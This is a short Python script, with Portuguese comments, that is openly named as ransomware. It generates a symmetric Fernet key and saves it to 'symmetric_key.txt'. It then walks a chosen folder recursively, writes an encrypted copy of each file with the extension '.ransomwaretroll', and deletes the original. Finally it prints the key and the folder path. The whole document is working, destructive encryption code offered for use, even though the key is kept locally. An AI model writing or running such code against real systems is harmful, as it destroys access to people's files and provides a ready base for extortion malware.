import os
from cryptography.fernet import Fernet

def generate_symmetric_key():
    return Fernet.generate_key()

def save_key(symmetric_key, file_path):
    with open(file_path, "wb") as key_file:
        key_file.write(symmetric_key)

def encrypt_file(file_path, symmetric_key):
    with open(file_path, "rb") as file:
        file_data = file.read()

    fernet = Fernet(symmetric_key)
    encrypted_data = fernet.encrypt(file_data)

    encrypted_file_path = file_path + ".ransomwaretroll"
    with open(encrypted_file_path, "wb") as new_file:
        new_file.write(encrypted_data)

def encrypt_folder(folder_path, symmetric_key):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            if not file_name.endswith(".ransomwaretroll"):
                file_path = os.path.join(root, file_name)
                encrypt_file(file_path, symmetric_key)
                os.remove(file_path)

if __name__ == "__main__":

    folder_to_encrypt = "CAMINHO DO DIRETORIO"  # caminho da pasta que deseja criptografar
    key_file_path = "symmetric_key.txt"
    
    symmetric_key = generate_symmetric_key()

    save_key(symmetric_key, key_file_path)

    encrypt_folder(folder_to_encrypt, symmetric_key)


print("\n")
print("==================================================================\n")
print("Chave simétrica:", symmetric_key, "\n")
print("Arquivos criptografados:", folder_to_encrypt, "\n")
print("==================================================================\n")
